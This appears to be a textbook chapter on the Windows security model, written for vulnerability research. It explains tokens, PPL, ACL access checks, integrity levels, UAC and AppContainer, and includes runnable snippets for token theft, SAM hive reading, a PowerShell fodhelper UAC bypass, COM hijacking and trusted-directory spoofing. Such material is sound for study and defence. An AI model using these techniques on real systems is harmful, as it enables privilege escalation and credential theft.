# Chapter 03 — Windows Security Model

> The Windows security model — tokens, security descriptors, ACLs, integrity levels, impersonation, AppContainers — is the primary attack surface for privilege escalation and sandbox escape. Before finding bugs here, you must understand the model precisely enough to know when a behavior violates it. This chapter builds that model from the ground up.

---

## 1. Token Anatomy

Every thread and process has an associated *access token*. The token is the identity credential used for all access checks on the machine.

> **Exploitation:** ch08 §3 (Potato family abuses token impersonation). ch09 §5 (coercion as token impersonation primitive).

### Token Structure

```
_TOKEN
├── UserAndGroups
│   ├── User SID (the "who are you" — e.g., S-1-5-21-...-1001)
│   └── Groups[] (array of {SID, Attributes})
│       ├── SE_GROUP_ENABLED        — group is active for access checks
│       ├── SE_GROUP_MANDATORY      — cannot be disabled
│       ├── SE_GROUP_OWNER          — default owner for new objects
│       └── SE_GROUP_LOGON_ID       — logon session SID
│
├── Privileges (SE_PRIVILEGE_ATTRIBUTES per privilege)
│   ├── Present    — privilege exists in token
│   ├── Enabled    — privilege is currently active
│   └── EnabledByDefault — enabled at logon without explicit AdjustTokenPrivileges
│
├── PrimaryGroup SID — default group SID for new objects
├── DefaultDacl — default DACL applied to new objects created by this token
├── TokenSource — source info (e.g., "User32")
├── ExpirationTime
├── ImpersonationLevel — Anonymous / Identification / Impersonation / Delegation
├── TokenType — TokenPrimary or TokenImpersonation
├── IntegrityLevel — Untrusted / Low / Medium / High / System (as a SID in Groups[])
├── RestrictedSids — if non-empty, token is restricted (both normal and restricted SIDs must pass access check)
└── TrustLevel — (Windows 10+) for Protected Process Light
```

**Key insight:** The integrity level is stored as a SID in the Groups array, with attribute `SE_GROUP_INTEGRITY | SE_GROUP_INTEGRITY_ENABLED`. The SID itself encodes the level (e.g., `S-1-16-8192` = Medium, `S-1-16-12288` = High, `S-1-16-16384` = System).

### Inspecting Tokens with NtObjectManager

```powershell
Import-Module NtObjectManager

# Current process token
$token = Get-NtToken -Primary
$token.User                    # User SID
$token.Groups                  # All groups with attributes
$token.Privileges              # All privileges
$token.IntegrityLevel          # Integrity level
$token.ImpersonationLevel      # Impersonation level (Primary tokens: N/A)
$token.IsRestricted            # Whether restricted token

# Specific process
$proc = Get-NtProcess -Name "lsass.exe"
$token = Get-NtToken -Process $proc -Duplicate
```

### 1.1 RestrictedSids — How Restricted Tokens Work

A *restricted token* is a token created via `NtFilterToken` (Win32: `CreateRestrictedToken`) that carries a second SID list called `RestrictedSids`. When `Token.IsRestricted == true`, the Security Reference Monitor performs **two independent access checks**:

1. **Normal SID check** — the token's regular `UserAndGroups` list against the DACL
2. **Restricted SID check** — the token's `RestrictedSids` list against the same DACL

**Both checks must independently succeed** for access to be granted. This means a restricted token can only access an object if that object has ACEs that satisfy both the normal SID list *and* the restricted SID list. The effective permission is the **intersection** of what both lists would be granted.

```
Access = (access via normal SIDs) ∩ (access via RestrictedSids)
```

**Common usage:** `CreateRestrictedToken` is used by:
- `CreateProcessWithLogonW` internally for some restricted sandbox contexts
- Internet Explorer's Protected Mode (pre-AppContainer) to create Low-IL restricted tokens
- Services that want to shed capabilities before spawning child processes

**Checking RestrictedSids:**
```powershell
$token = Get-NtToken -Current
$token.IsRestricted               # True if token has restricted SID list
$token.RestrictedSids             # Enumerate restricted SID list
$token.RestrictedSids | ForEach-Object { $_.Sid.ToString() }
```

**Attacker implication — restricted token bypass:** If an attacker controls a process running with a restricted token but can obtain a *handle* to a non-restricted token from the same session (e.g., via handle inheritance, or a poorly secured token object), they can call `DuplicateTokenEx` on it to produce an unrestricted token. The restricted SID check only applies to the *current* token; duplicating an unrestricted token from another process entirely bypasses the restriction. This is why token object handles on shared processes must be treated with the same care as the process handle itself.

```powershell
# Enumerate processes — find one whose token has RestrictedSids
Get-NtProcess -Access QueryLimitedInformation | ForEach-Object {
    try {
        $tok = Get-NtToken -Process $_ -Duplicate -Access Query
        if ($tok.IsRestricted) {
            Write-Host "$($_.Name): IsRestricted, RestrictedSids=$($tok.RestrictedSids.Count)"
        }
        $tok.Close()
    } catch {}
}
```

### 1.2 TrustLevel — Protected Process Light (PPL) Trust

Windows 8.1 introduced *Protected Process Light* (PPL) as an extension of Protected Processes. A PPL process is protected from access even by administrator-level processes unless the accessor is also a PPL at equal or higher trust.

The `TrustLevel` field in a token is represented as a SID under the authority `S-1-19-*`. The known trust level SIDs are:

| PPL Signer Level | TrustLevel SID | Typical Usage |
|-----------------|----------------|---------------|
| WinTrustedInstaller | S-1-19-512-8192 | TrustedInstaller.exe, Windows Update components |
| WinSystem | S-1-19-512-4096 | System processes with highest PPL level |
| WinTcb | S-1-19-512-1024 | Kernel trusted computing base — csrss.exe, smss.exe, wininit.exe |
| WinWindows | S-1-19-512-512 | Core Windows services — lsass.exe (as PPL) |
| WinCodeGen | S-1-19-512-256 | JIT / code generation service |
| WinLsa | S-1-19-512-128 | LSA protection |
| WinAntimalware | S-1-19-512-64 | AV/EDR products that register with ELAM |
| WinEarlyLaunch | S-1-19-512-32 | ELAM drivers |
| WinTcbLight | S-1-19-512-8 | Lighter TCB |

**PPL access check rule:** A process can only open a handle to a PPL process if:
- The opener is also PPL with equal or higher signer level, **OR**
- The requested access rights are limited to a small allowed set (e.g., `PROCESS_QUERY_LIMITED_INFORMATION`)

**TrustLevel interaction with token access checks:** When `SeAccessCheck` evaluates access to a PPL process object, `PsTestProtectedProcessIncompatibility` checks whether the opener's TrustLevel SID is present and at least as privileged as the target's. This check occurs *before* the normal DACL check — the DACL is irrelevant if the PPL check fails. Even a SYSTEM-level token without TrustLevel cannot open `lsass.exe` (PPL-WinLsa) with `PROCESS_VM_READ`.

```powershell
# Check if a process is PPL and at what level
$proc = Get-NtProcess -Name "lsass.exe" -Access QueryLimitedInformation
$proc.IsProtectedProcess           # True/False
$proc.ProtectionLevel              # PPL signer type and level
```

```windbg
; Check PPL protection on EPROCESS
dt nt!_EPROCESS poi(poi(@$prcb+0x8)) Protection
; Protection.Type: 0=None, 1=ProtectedLight, 2=Protected
; Protection.Signer: see PS_PROTECTED_SIGNER enum
```

**PPL Bypass Research 2024:**

- **CVE-2024-21338 (February 2024):** `appid.sys` kernel vulnerability exploited by Lazarus Group. Provides kernel read/write primitive → strips PPL protection flags directly from the target process's `EPROCESS.Protection` field. This is stealthier than BYOVD because it abuses a legitimate signed kernel driver that ships with Windows — no need to load a third-party vulnerable driver.

  ```
  Attack chain:
  1. Exploit appid.sys to gain kernel R/W
  2. Find target process EPROCESS address
  3. Overwrite EPROCESS.Protection byte to 0x00 (unprotected)
  4. Now OpenProcess(PROCESS_ALL_ACCESS) on lsass succeeds
  5. Dump credentials / inject code
  ```

- **CVE-2024-26218 (April 2024):** Windows Kernel EoP — bypasses integrity-level enforcement mechanisms used by PPL. Allows bypassing the pre-DACL PPL check via crafted access token manipulation.

- **EDR silencing via PPL bypass:** Multiple red team blogs (2024) documented killing EDR agents by using kernel exploits to strip `EPROCESS.Protection` flags from the EDR service's process, then terminating it via `TerminateProcess`. The process goes from PPL-WinAntimalware to unprotected without any ELAM re-evaluation.

- **PPL VTL1 enforcement in 24H2:** On compatible hardware (HVCI-capable systems), some PPL flags are partially backed by the Secure Kernel running in VTL1. Overwriting `EPROCESS.Protection` in VTL0 kernel memory does not fully disable protection if VTL1 is actively validating the protection state. This is an evolving mitigation — not uniformly enforced yet.

**Tools:**
- [PPLcontrol by itm4n](https://github.com/itm4n/PPLcontrol) — inspect and manipulate PPL protection levels
- PPLdump — dump PPL-protected process memory using a cross-process handle leak technique

```powershell
# Check PPL level of all running processes
Get-NtProcess -Access QueryLimitedInformation | ForEach-Object {
    try {
        if ($_.IsProtectedProcess) {
            Write-Host "$($_.Name) [PID $($_.ProcessId)]: PPL=$($_.ProtectionLevel)"
        }
    } catch {}
}
```

### 1.3 Token Privilege Abuse Patterns

Certain privileges are dramatically more dangerous than others. When auditing a process for privilege escalation potential, the following privileges are the highest-value targets:

#### SeDebugPrivilege
**What it enables:** Open any process (including SYSTEM and PPL processes, subject to PPL restrictions) with `PROCESS_ALL_ACCESS`. Read/write any process's memory, inject code, steal tokens.

```c
// With SeDebugPrivilege, this succeeds for any non-PPL process:
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPid);
// Then steal token:
OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken);
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hImpToken);
ImpersonateLoggedOnUser(hImpToken);  // Now running as target process's user
```

**Who has it:** Administrators (disabled by default in token — must be explicitly enabled via `AdjustTokenPrivileges`). Debugger processes.

**Exploitation path:** Process with SeDebugPrivilege → open `lsass.exe` → steal SYSTEM token → `CreateProcessWithTokenW`.

#### SeLoadDriverPrivilege
**What it enables:** Load an arbitrary kernel driver via `NtLoadDriver`. On systems without HVCI (Hypervisor-Protected Code Integrity) and when Driver Signature Enforcement (DSE) is disabled or bypassed, this allows loading an **unsigned kernel driver** — full kernel code execution.

**Who has it:** Administrators (disabled by default). Some service accounts that manage drivers.

**Exploitation path (DSE bypass):** `SeLoadDriverPrivilege` + a *vulnerable signed driver* (BYOVD — Bring Your Own Vulnerable Driver) to disable DSE, then load unsigned driver.

```powershell
# Check if current token has SeLoadDriverPrivilege
(Get-NtToken).Privileges | Where-Object { $_.Name -eq "SeLoadDriverPrivilege" }
```

#### SeBackupPrivilege
**What it enables:** Open any file for reading by passing `FILE_FLAG_BACKUP_SEMANTICS` to `CreateFile`, bypassing normal DACL checks. Specifically, the access check is skipped for read/enumerate operations. This allows reading **SAM**, **SYSTEM**, **SECURITY** registry hives — enough to dump all local account hashes.

```c
// With SeBackupPrivilege enabled:
HANDLE hFile = CreateFile(
    L"C:\\Windows\\System32\\config\\SAM",
    GENERIC_READ,
    FILE_SHARE_READ,
    NULL,
    OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS,   // This flag triggers backup privilege check
    NULL
);
// Succeeds even though DACL would deny GENERIC_READ to non-SYSTEM
```

**Key nuance:** `SeBackupPrivilege` must be *enabled* in the token at the time of the call — having it present (but disabled) is not enough. Call `AdjustTokenPrivileges` first.

#### SeRestorePrivilege
**What it enables:** Write to any file bypassing DACL via `FILE_FLAG_BACKUP_SEMANTICS`. Symmetric to `SeBackupPrivilege`. Allows overwriting system files, replacing binaries, writing to registry hives.

**Combined power:** `SeBackupPrivilege` + `SeRestorePrivilege` = read any file + write any file = full filesystem control, including overwriting `C:\Windows\System32\` binaries.

#### SeTakeOwnershipPrivilege
**What it enables:** Take ownership of any securable object (file, registry key, process, token, etc.) without needing `WRITE_OWNER` in the DACL. Once you own the object, you can modify its DACL (`WRITE_DAC` is also granted to the owner by default), giving yourself any access you want.

```c
// With SeTakeOwnershipPrivilege:
// 1. Take ownership of target file
SetNamedSecurityInfo(
    L"C:\\SomeProtectedFile.exe",
    SE_FILE_OBJECT,
    OWNER_SECURITY_INFORMATION,
    pMyUserSid, NULL, NULL, NULL
);
// 2. Now you own it — change DACL to grant yourself GENERIC_ALL
SetNamedSecurityInfo(..., DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);
// 3. Now open it
```

**Exploitation path:** SeTakeOwnership → take ownership of a system binary or service executable → change DACL → overwrite → persistence/escalation.

#### SeAssignPrimaryTokenPrivilege
**What it enables:** Assign a primary token to a new process via `CreateProcessWithTokenW` — even *without* `SeImpersonatePrivilege`. This is the direct mechanism for spawning a new process under a different identity.

**Relationship with SeImpersonatePrivilege:** `SeImpersonatePrivilege` allows thread-level impersonation. `SeAssignPrimaryTokenPrivilege` allows process-level token assignment. In Potato exploit variants, both paths lead to SYSTEM — the practical difference is which API is used.

#### SeCreateSymbolicLinkPrivilege
**What it enables:** Create NTFS symbolic links (via `NtCreateSymbolicLinkObject` in the Object Manager namespace) and directory junctions without UAC elevation. On its own this is limited, but combined with a privileged process that follows symlinks during a file operation, it enables symlink-based TOCTOU attacks.

**Exploitation pattern:** Service runs as SYSTEM, creates a file at path P, but P can be redirected via a junction/symlink the attacker creates at Medium integrity — classic NTFS junction + symlink attack (e.g., CVE-2020-0668 pattern).

---

## 2. Security Descriptors

Every securable object (files, registry keys, processes, tokens, named pipes, mutexes, etc.) can have a *security descriptor* attached.

### Binary Layout

```
SECURITY_DESCRIPTOR
├── Revision (1 byte = 1)
├── Sbz1 (alignment padding)
├── Control (2 bytes — flags: SE_DACL_PRESENT, SE_SACL_PRESENT, SE_DACL_PROTECTED, etc.)
├── OffsetOwner → SID (owner of the object)
├── OffsetGroup → SID (primary group)
├── OffsetDacl  → ACL (Discretionary ACL — who can access)
└── OffsetSacl  → ACL (System ACL — auditing rules)

ACL
├── AclRevision
├── AceCount
└── Ace[] (variable length)
    ├── AceType: ACCESS_ALLOWED_ACE / ACCESS_DENIED_ACE / SYSTEM_AUDIT_ACE / OBJECT_ACE / ...
    ├── AceFlags: OBJECT_INHERIT_ACE | CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE | INHERITED_ACE
    ├── AccessMask (32 bits — specific + standard + generic rights)
    └── SidStart → SID (who this ACE applies to)
```

**DACL evaluation order:** Explicit deny ACEs → Explicit allow ACEs → Inherited deny → Inherited allow. If the DACL is NULL (no DACL present), access is granted to everyone. If DACL is empty (present but zero ACEs), access is denied to everyone.

### Inheritable ACEs

ACEs with `CONTAINER_INHERIT_ACE` propagate to child containers (directories, registry keys). ACEs with `OBJECT_INHERIT_ACE` propagate to child leaf objects (files, values). The `INHERIT_ONLY_ACE` flag means the ACE is only for inheritance — does not apply to the object itself.

**Bug pattern:** Missing inheritance propagation in a directory DACL can cause newly created child objects to have overly permissive or overly restrictive DACLs.

---

## 3. Access Check Algorithm — Step by Step

When a process calls `OpenFile`, `OpenProcess`, `RegOpenKey`, etc., the kernel Security Reference Monitor (SRM) executes `SeAccessCheck` (public) / `SepAccessCheck` (internal).

### Algorithm

```
Input:
  - Token (the caller's token — may be impersonation token if impersonating)
  - SecurityDescriptor (from the target object)
  - DesiredAccess (what the caller wants)

Steps:

1. TOKEN VALIDITY CHECK
   If token is impersonation token AND ImpersonationLevel < Identification:
     → DENY (Anonymous tokens cannot be used for impersonation access checks on most objects)

2. OWNER SHORTCUT
   If Token.User SID == SecurityDescriptor.Owner SID:
     → Grant READ_CONTROL + WRITE_DAC unconditionally (owner can always change the DACL)

3. NULL DACL CHECK
   If SecurityDescriptor.Dacl == NULL:
     → GRANT all requested access (no DACL = everyone has full access)

4. EMPTY DACL CHECK
   If SecurityDescriptor.Dacl exists but AceCount == 0:
     → DENY all access

5. ACE ENUMERATION (in order)
   For each ACE in DACL:
     a. Skip if INHERIT_ONLY_ACE flag set
     b. Check if ACE.Sid is in token's SID list (user SID or any enabled group SID)
        → For restricted tokens: also check RestrictedSids list (see §5a below)
     c. If match:
        - ACCESS_DENIED_ACE and (ACE.AccessMask & DesiredAccess) != 0:
          → DENY immediately (deny ACEs are checked before allow ACEs for explicit ACEs)
        - ACCESS_ALLOWED_ACE and (ACE.AccessMask & DesiredAccess):
          → Mark those bits as granted

5a. RESTRICTED TOKEN DOUBLE CHECK (if Token.IsRestricted == true)
   The access check in step 5 is performed TWICE:
     Pass 1: Against the normal UserAndGroups SID list  → produces GrantedAccess_Normal
     Pass 2: Against the RestrictedSids list             → produces GrantedAccess_Restricted
   Final granted access = GrantedAccess_Normal & GrantedAccess_Restricted
   Both passes must independently grant the desired access.
   An ACE that matches only in Pass 1 but not Pass 2 will result in DENY.

6. PRIVILEGE CHECK
   If remaining DesiredAccess bits not yet granted:
     Check if the token has a privilege that would grant them
     (e.g., SeSecurityPrivilege grants ACCESS_SYSTEM_SECURITY)

7. RESULT
   If all DesiredAccess bits granted: ACCESS_GRANTED
   Otherwise: ACCESS_DENIED
```

**Key attack surfaces:**
- NULL DACL on any object → full access for everyone
- Overly broad ACE (e.g., `Everyone:WRITE_DAC`) → attacker can rewrite the DACL
- Incorrect ACE ordering (allow before deny in same category) → incorrect access
- Missing SID in token check (restricted tokens) → privilege bypass via unrestricted token duplication

**Restricted token bypass:** When a restricted token process attempts to access an object, if the `RestrictedSids` list does not contain a SID matching an allow ACE on the target object, access is denied — even if the normal SID list would grant it. Attackers who can obtain a non-restricted version of the same token (e.g., from a parent process or via handle inheritance) bypass this restriction entirely.

---

## 4. Mandatory Integrity Control (MIC)

MIC is a mandatory access control layer on top of the discretionary ACL system. It cannot be bypassed by an object owner modifying DACLs.

### Integrity Levels

| Label | SID | Typical Users |
|-------|-----|--------------|
| Untrusted | S-1-16-0 | Anonymous, truly sandboxed |
| Low | S-1-16-4096 | IE Protected Mode, Chrome/Edge renderer, sandboxed downloads |
| Medium | S-1-16-8192 | Standard user processes, cmd.exe, Explorer |
| High | S-1-16-12288 | Elevated (UAC elevated) processes, administrators |
| System | S-1-16-16384 | SYSTEM account, services running as LocalSystem |
| Protected | S-1-16-20480 | Protected Process Light (LSASS, AV) |

### MIC Policy (SACL MANDATORY_LABEL_ACE)

Each object has an optional mandatory label ACE in its SACL specifying its integrity level and policy:

```
SE_SACL_MANDATORY_LABEL_NO_WRITE_UP  — processes below object's IL cannot write to it
SE_SACL_MANDATORY_LABEL_NO_READ_UP   — processes below object's IL cannot read from it
SE_SACL_MANDATORY_LABEL_NO_EXECUTE_UP — processes below object's IL cannot execute it
```

**Default policy:** `NO_WRITE_UP` is the default for most objects. This means a Medium-IL process cannot write to a High-IL object even if the DACL would normally allow it.

**Attack implication:** Most Windows LPE bugs involve crossing the Medium → High or Medium → System boundary. A bug that only allows Medium → Low is not a privilege escalation.

> **Attack surface:** ch07 §4.4 (CVE-2024-49039 AppContainer→medium IL). ch08 §4 (RPC/COM boundary bugs exploit MIC).

### SeRelabelPrivilege

Allows a process to change an object's mandatory label. Normally, you can only lower an object's label (to match or below your own level). With `SeRelabelPrivilege`, you can raise it. Rarely granted, but some AV/EDR products grant it — overlooked escalation vector.

### MIC Updates 2024–2025

- No new named integrity levels were introduced.
- **Enforcement tightened:** More system services were moved to PPL, making the MIC IL boundary enforcement more difficult to exploit alone — attackers now need kernel-level access to bypass both MIC and PPL simultaneously.
- **VTL1 interactions:** On HVCI-capable hardware with Credential Guard or Secure Kernel active, some operations are impossible even for processes at SYSTEM integrity level — the Secure Kernel enforces a secondary check that MIC cannot override.
- **Windows Server 2025:** Stricter MIC policies applied to SMB and RPC interfaces. Some remote procedure call entry points now enforce that callers meet a minimum integrity level (Medium or High) before processing requests.
- **COM/RPC server enforcement:** Several COM and RPC servers were updated to explicitly check caller integrity level via `GetTokenInformation(TokenIntegrityLevel)` before processing sensitive requests, adding a software-layer MIC check in addition to the OS-level policy.

---

## 5. User Account Control (UAC)

UAC is the mechanism that requires explicit user consent for administrative operations. It is implemented via token filtering and elevation dialogs.

### Token Filtering on Logon

When an administrator logs in, Windows creates two tokens:
1. **Full admin token** (High IL, full group membership including Administrators SID)
2. **Filtered token** (Medium IL, Administrators SID marked `SE_GROUP_USE_FOR_DENY_ONLY`, many privileges removed)

The filtered token is used for normal operations. The full token is used only when UAC elevation is granted.

### Auto-Elevation

Some executables are auto-elevated without showing a UAC prompt. Conditions required:

1. Executable is in `%SystemRoot%` or `%SystemRoot%\System32\`
2. Manifest specifies `requestedExecutionLevel = requireAdministrator` OR `highestAvailable`
3. Executable is signed by Microsoft
4. Executable is on an internal auto-elevation whitelist (checked via catalog entry)

**UAC bypass pattern:** If you can cause an auto-elevated process to load a DLL from a user-writable location, or redirect one of its file operations, you can execute code in an elevated context without the UAC prompt.

### COM Elevation Moniker

Allows a COM object to be instantiated in an elevated context. The moniker is:
```
Elevation:Administrator!new:{CLSID}
```
The CLSID must be registered to allow COM elevation. The registration is under `HKLM\SOFTWARE\Classes\CLSID\{CLSID}\Elevation\Enabled = 1`.

**Attack surface:** COM objects registered for elevation that expose dangerous methods — specifically, any method that allows file operations, process creation, or service registration.

### 5.1 UAC Bypass Patterns

#### ICMLuaUtil COM Object
`ICMLuaUtil` is an internal COM interface (IID `{6EDD6D74-C007-4E75-B76A-E5740995E24C}`) implemented by `cmluautil.dll`, running elevated. It is accessible via the elevation moniker and has historically exposed methods for:
- Arbitrary file copy/move operations as an elevated principal
- Registry writes to HKLM locations

The standard exploit pattern:
```
1. Instantiate ICMLuaUtil via elevation moniker (no UAC prompt — whitelisted)
2. Call SetRegistryStringValue() or ShellExec() to execute arbitrary command elevated
```
This was patched in later Windows versions by adding stricter caller validation, but the pattern recurs in similar COM objects.

#### fodhelper.exe — Registry-Based UAC Bypass
`fodhelper.exe` (`C:\Windows\System32\fodhelper.exe`) is an auto-elevated binary (signed Microsoft, in System32, highestAvailable manifest). It reads from `HKCU\Software\Classes\ms-settings\shell\open\command` to handle the `ms-settings:` protocol.

**Exploit chain:**
```
1. Create HKCU\Software\Classes\ms-settings\shell\open\command (user-writable — HKCU)
2. Set default value = "C:\Windows\System32\cmd.exe"
3. Set DelegateExecute = "" (empty — required to trigger ShellExecute path)
4. Run fodhelper.exe
5. fodhelper auto-elevates → opens ms-settings: → reads HKCU registry → executes cmd.exe elevated
```

**Why it works:** HKCU registry is always writable by the current user. Auto-elevated processes that consult HKCU for configuration before HKLM are inherently exploitable this way. The registry merge (`HKCU\Software\Classes` overrides `HKCR`) means user-supplied values shadow system values.

```powershell
# Classic fodhelper UAC bypass (educational reference)
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "(Default)" -Value "cmd.exe"
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "DelegateExecute" -Value ""
Start-Process C:\Windows\System32\fodhelper.exe
# Cleanup after:
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

**Mitigation:** Set `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin = 2` (always prompt) and `EnableLUA = 1`. UAC level "Always Notify" eliminates most auto-elevation bypass paths.

#### Environment Variable Abuse in Auto-Elevated Processes
Auto-elevated processes that reference environment variables in file paths (e.g., `%TEMP%`, `%APPDATA%`, `%PATH%`) are potentially exploitable if the user can set those variables before launch. Environment variables are inherited from the parent process — when the auto-elevated process is launched, it receives the parent's environment unless APPINFO explicitly sanitizes it.

**Pattern:**
```
Auto-elevated process executes: %COMSPEC% → resolves to cmd.exe from %PATH%
If attacker modifies COMSPEC or places a malicious cmd.exe earlier in PATH
→ auto-elevated process loads attacker binary at High IL
```
Modern Windows sanitizes `PATH` and some variables before elevation. The remaining attack surface is in custom or third-party auto-elevated tools.

#### DLL Search Order Hijack in Auto-Elevated Processes
If an auto-elevated process (`requestedExecutionLevel = requireAdministrator`) loads a DLL by name without an absolute path, the DLL search order applies:

```
1. Application directory
2. System32
3. System directory (SysWOW64)
4. Windows directory
5. Current working directory  ← often attacker-controlled
6. PATH directories           ← partially attacker-controlled
```

If any directory before System32 is user-writable (e.g., the application directory is in `Program Files` but writable due to weak ACL, or the CWD is in a user-writable path), a DLL placed there will be loaded by the auto-elevated process — giving the attacker High-IL code execution.

**Discovery methodology:**
```powershell
# Use Process Monitor (procmon) with filter:
# Path contains ".dll" AND Result is "NAME NOT FOUND"
# Process is the auto-elevated target
# Then check if the search path directories are user-writable
icacls "C:\SomePath\" | findstr /i "(F) (M) (W)"
```

### 5.2 UAC Bypass Techniques — New in 2024–2025

#### CVE-2024-6769 (Fortra, 2024)
**CVSS:** 6.3. Chain: Drive Remapping + SxS DLL Poisoning + auto-elevated COM objects.

```
Attack chain:
1. Create a virtual drive remapping (e.g., subst X: C:\Users\attacker\malicious)
2. Place a malicious DLL in a path that shadows a legitimate System32 DLL
   via the Side-by-Side (SxS) assembly search order
3. Trigger an auto-elevated COM object whose activation search hits the poisoned path
4. COM object auto-elevates (no UAC prompt) → loads attacker DLL → High IL code execution
```

This chain was particularly notable because it combined three individually-known techniques (drive remapping, SxS redirection, COM elevation) in a novel sequence not previously documented as a single CVE.

#### MockDirs — Trusted Directory Spoofing (Unpatched as of 2025)
Create a directory named `C:\Windows \System32\` (note the trailing space). Windows path normalization in some contexts strips the trailing space, causing the spoofed path to be treated as the real System32.

```cmd
mkdir "C:\Windows \System32"
copy malicious.exe "C:\Windows \System32\malicious.exe"
```

Auto-elevation path validation checks `C:\Windows\System32\` but the spaced variant passes because it is technically a different path that some path normalization functions collapse to the same result. Still unpatched as of mid-2025.

**Reference:** [UACME](https://github.com/hfiref0x/UACME) method list documents this technique.

#### COM Object Hijacking via HKCU
**Targets:** `fodhelper.exe`, `computerdefaults.exe`, `sdclt.exe` — all auto-elevated, all look up COM class registrations.

**Mechanism:** COM class registration lookups follow `HKCU\Software\Classes\CLSID` before `HKLM\SOFTWARE\Classes\CLSID`. A standard user can create entries in `HKCU` without elevation.

```powershell
# Generic COM hijack pattern for auto-elevated processes
$clsid = "{TARGET-CLSID-HERE}"
$regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Users\user\payload.dll"
Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"
# Trigger the auto-elevated target process
```

**Threat actor usage 2024:** LockBit and BlackBasta ransomware affiliates both documented COM Object Hijacking against `computerdefaults.exe` and `sdclt.exe` in 2024 incident response reports as their UAC bypass of choice — reliable, doesn't touch disk in a noisy way, widely available in red team kits.

#### CVE-2024-38100 (July 2024)
**CVSS:** 7.8. Windows File Explorer shell extension EoP. A specially crafted shell extension interaction in Explorer's elevated context allows an attacker to achieve High IL code execution. Patched in July 2024 Patch Tuesday.

#### CVE-2025-21204 (April 2025)
**CVSS:** 7.8. Windows Process Activation EoP via symbolic link/junction during Windows Update processing. The vulnerability exists in both UAC and Administrator Protection paths — even the newer JIT token mechanism is affected when the symlink is planted before the elevated process runs.

```
Attack pattern:
1. Monitor for Windows Update processing activity (WMI event subscription or service polling)
2. At the right moment, plant a directory junction or NTFS symbolic link
   at the path where Windows Update writes intermediate files
3. Update processing code follows the link — privileged file write to attacker-chosen location
4. Use privileged write for persistence or service binary replacement
```

**Note:** This CVE is relevant to both §5 (UAC) and §9 (Administrator Protection) — the symlink race condition affects both elevation mechanisms.

#### UACME Project Reference
[UACME by hfiref0x](https://github.com/hfiref0x/UACME) is the canonical public repository of UAC bypass methods. It was actively updated throughout 2024 with new methods targeting Windows 11 23H2 and 24H2 variants. Security researchers use it as a reference for understanding which bypass classes remain viable on current patch levels.

---

## 6. Impersonation Levels

When a server impersonates a client (e.g., a service impersonates the user making a request), the impersonation level controls how powerful the resulting token is.

| Level | Value | Capabilities |
|-------|-------|-------------|
| Anonymous | 0 | Server cannot obtain identity information |
| Identification | 1 | Server can query identity but cannot act on behalf of client |
| Impersonation | 2 | Server can act as client **on the local machine** |
| Delegation | 3 | Server can act as client **on remote machines** (requires Kerberos + unconstrained delegation) |

**Critical for LPE:** `ImpersonateNamedPipeClient()` and similar calls require the client connection to have been established at `Impersonation` level or higher. If the client connects at `Anonymous` level, the server receives an anonymous token — useless for escalation.

**How Potato exploits work:** They coerce a SYSTEM-level process to connect to an attacker-controlled named pipe at Impersonation level — giving the attacker a SYSTEM impersonation token that they can then use to `CreateProcessWithTokenW` a new SYSTEM process.

---

## 7. AppContainer and LPAC

AppContainer is the sandbox used by UWP applications, the Edge browser process (not renderer), and processes declared with a package identity.

### AppContainer Token Structure

An AppContainer token has:
- **Package SID:** Identifies the application package (e.g., `S-1-15-2-...`)
- **Capability SIDs:** Each capability the app declared (e.g., internetClient = `S-1-15-3-1`, webcam = specific SID)
- **Low integrity level**
- **Restricted token:** The AppContainer SID is added to the token's Groups as a restricting SID

### Access Check for AppContainer

For an AppContainer process to access an object, BOTH conditions must be met:
1. The normal DACL check passes (using the process token's user/group SIDs)
2. The object has an ACE granting access to the AppContainer's package SID or capability SID (or `ALL APPLICATION PACKAGES` group `S-1-15-2-1`)

This is the "double-gating" model: normal ACL alone is insufficient; AppContainer SID must also be explicitly granted.

### 7.1 Double-Gating Internal Mechanism

The AppContainer access check is implemented via `NtAccessCheckByTypeAndAuditAlarm` (and the internal `SeAccessCheckByType`). The SRM performs a modified access check with an additional phase:

```
Phase 1 (normal DACL check):
  - Evaluate DACL against token's normal UserAndGroups
  - Produce intermediate GrantedAccess_Normal

Phase 2 (AppContainer capability check — only if token has AppContainerSid):
  - Evaluate DACL against:
      a. The AppContainer Package SID
      b. All Capability SIDs in the token
      c. The well-known group S-1-15-2-1 (ALL APPLICATION PACKAGES)
      d. For non-LPAC: also S-1-15-2-2 (ALL RESTRICTED APPLICATION PACKAGES)
  - Produce GrantedAccess_Container

Final = GrantedAccess_Normal & GrantedAccess_Container
```

This ensures that an AppContainer process can only access objects that *explicitly* grant access to AppContainer identities. Objects with no AppContainer-relevant ACE are inaccessible even if the normal user DACL would allow it.

### 7.2 ALL APPLICATION PACKAGES vs ALL RESTRICTED APPLICATION PACKAGES

| SID | Value | Meaning |
|-----|-------|---------|
| ALL APPLICATION PACKAGES | S-1-15-2-1 | Any AppContainer process (including LPAC) |
| ALL RESTRICTED APPLICATION PACKAGES | S-1-15-2-2 | Only LPAC processes |

**Standard AppContainer (non-LPAC):** Token contains `S-1-15-2-1` as an active group SID. Access check Phase 2 can be satisfied by ACEs granting `S-1-15-2-1`.

**LPAC (Less Privileged AppContainer):** The token does **not** contain `S-1-15-2-1` as an active group — it is either absent or marked `USE_FOR_DENY_ONLY`. The LPAC token *does* contain `S-1-15-2-2`. This means:
- Objects with only `S-1-15-2-1` ACEs → LPAC cannot access them
- Objects with `S-1-15-2-2` ACEs → LPAC can access them

